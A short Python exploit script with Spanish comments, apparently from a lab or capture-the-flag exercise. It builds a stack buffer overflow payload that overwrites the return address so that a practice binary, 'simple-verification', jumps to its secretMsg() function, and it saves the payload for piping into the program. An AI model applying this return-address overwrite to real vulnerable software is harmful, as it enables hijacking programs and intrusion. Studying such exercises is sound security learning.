import struct
# Dirección de memoria de secretMsg()
secretMsg_dir = 0x0000000000401156

# Relleno hasta sobreescribir el rbp
padding = b"A" * 24

# Convertimos la dirección a formato little-endian
payload = padding + struct.pack("<Q", secretMsg_dir)

# Ejecutamos el programa y enviamos el payload
print("[+] Enviando exploit...")
with open("input2.txt", "wb") as f:
	f.write(payload)
print("[+] Exploit guardado en input2.txt, ejecuta:")
print("	cat input2.txt | ./simple-verification")
